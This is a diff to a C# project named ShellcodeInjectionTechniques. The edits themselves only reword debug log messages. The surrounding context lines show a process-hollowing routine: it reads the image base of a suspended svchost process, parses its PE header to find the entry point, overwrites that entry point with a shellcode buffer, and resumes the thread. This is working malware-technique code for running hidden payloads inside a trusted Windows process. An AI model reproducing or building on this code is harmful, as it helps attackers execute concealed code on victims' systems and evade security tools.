@@ -31,7 +31,7 @@ namespace ShellcodeInjectionTechniques
             byte[] addrBuf = new byte[IntPtr.Size];
             IntPtr nRead = IntPtr.Zero;
             ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
-            Debug("[+] ReadProcessMemory(): 0x{0}", new string[] { ptrToImageBase.ToString("X") });
+            Debug("[+] ReadProcessMemory() - image base pointer: 0x{0}", new string[] { ptrToImageBase.ToString("X") });
 
             // locate svchost base, converted to a 64-bit integer then cast to an IntPtr
             IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
@@ -40,7 +40,7 @@ namespace ShellcodeInjectionTechniques
             // read the memory location to get the entry point from the PE header
             byte[] data = new byte[0x200];
             ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
-            Debug("[+] ReadProcessMemory(): 0x{0}", new string[] { svchostBase.ToString("X") });
+            Debug("[+] ReadProcessMemory() - svchost base: 0x{0}", new string[] { svchostBase.ToString("X") });
 
             uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
             uint opthdr = e_lfanew_offset + 0x28;
@@ -51,7 +51,7 @@ namespace ShellcodeInjectionTechniques
             WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
             Debug("[+] WriteProcessMemory(): 0x{0}", new string[] { addressOfEntryPoint.ToString("X") });
 
-            Debug("[+] ResumeThread(): 0x{0}", new string[] { lpProcessInformation.hThread.ToString("X") });
+            Debug("[+] ResumeThread() - thread handle: 0x{0}", new string[] { lpProcessInformation.hThread.ToString("X") });
             ResumeThread(lpProcessInformation.hThread);
         }
     }
